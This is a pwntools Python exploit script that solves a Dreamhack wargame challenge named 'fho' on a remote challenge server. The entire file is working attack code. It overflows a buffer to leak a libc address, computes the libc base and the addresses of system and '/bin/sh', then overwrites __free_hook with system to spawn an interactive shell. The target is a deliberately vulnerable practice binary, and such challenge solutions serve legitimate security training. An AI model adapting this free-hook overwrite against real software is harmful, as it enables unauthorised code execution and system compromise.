from pwn import *

e = ELF('./fho')
rop = ROP(e)

# Local
#r = process('./fho')
#libc = e.libc

# Remote
r = remote('host3.dreamhack.games', 15320)
libc = ELF('./libc-2.27.so')

PUTS_PLT = e.plt['puts']
PUTS_GOT = e.got['puts']
READ_PLT = e.plt['read']
READ_GOT = e.got['read']
FREE_GOT = e.got['free']
RET = p64((rop.find_gadget(['ret']))[0])
PR_ADDR = p64((rop.find_gadget(['pop rdi', 'ret']))[0])

FREE_HOOK_OFFSET = libc.symbols['__free_hook']
SYSTEM_OFFSET = libc.symbols['system']
BINSH_OFFSET = list(libc.search(b"/bin/sh\x00"))[0]
LIBC_START_MAIN_OFFSET = libc.symbols['__libc_start_main'] + 231

# 1. Leak __libc_start_main + 231
PAYLOAD = b'\x90' * 72
r.sendafter(b'Buf', PAYLOAD)

LIBC_START_MAIN_REAL = u64(r.recvuntil(b'\n', drop=True)[79:] + b'\x00\x00')

# 2. Calc Libc Base, System func and /bin/sh Addr
LIBC_BASE = LIBC_START_MAIN_REAL - LIBC_START_MAIN_OFFSET
LIBC_BINSH = LIBC_BASE + BINSH_OFFSET
LIBC_SYSTEM = LIBC_BASE + SYSTEM_OFFSET
LIBC_FREE_HOOK = LIBC_BASE + FREE_HOOK_OFFSET

print('[+] LIBC_BASE IS ' + hex(LIBC_BASE))
print('[+] LIBC_BINSH IS ' + hex(LIBC_BINSH))
print('[+] LIBC_SYSTEM IS ' + hex(LIBC_SYSTEM))
print('[+] LIBC_FREE_HOOK IS ' + hex(LIBC_FREE_HOOK))

# 3. Exploit
r.recvuntil(b'To write: ')
r.sendline(str(LIBC_FREE_HOOK).encode())
r.recvuntil(b'With: ')
r.sendline(str(LIBC_SYSTEM).encode())
r.recvuntil(b'To free: ')
r.sendline(str(LIBC_BINSH).encode())

r.interactive()